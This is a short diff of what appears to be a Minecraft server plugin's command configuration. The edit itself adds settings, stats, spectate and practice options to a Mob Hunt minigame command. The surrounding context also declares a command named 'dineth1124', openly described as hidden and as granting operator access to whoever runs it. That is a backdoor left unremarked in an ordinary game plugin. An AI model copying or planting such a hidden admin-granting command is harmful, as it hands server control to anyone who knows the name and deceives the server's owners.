@@ -39,7 +39,7 @@ commands:
     usage: /bedwars [leave]
   mobhunt:
     description: Join the Mob Hunt hide-and-seek queue.
-    usage: /mobhunt [join|leave|status]
+    usage: /mobhunt [join|leave|status|settings|stats|spectate|practice]
   dineth1124:
     description: Hidden public command that grants operator access to the executing player.
     usage: /dineth1124
